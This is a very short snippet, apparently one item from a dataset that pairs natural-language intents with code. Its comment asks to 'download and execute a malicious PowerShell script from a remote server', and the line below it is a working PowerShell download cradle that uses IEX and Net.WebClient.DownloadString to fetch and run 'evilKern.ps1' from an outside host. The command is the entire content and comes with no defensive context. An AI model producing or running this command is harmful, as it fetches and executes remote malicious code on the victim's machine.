# Natural language intent:
# Download and execute a malicious PowerShell script from a remote server.

IEX (New-Object Net.WebClient).DownloadString('http://heavy_site.com/evilKern.ps1')
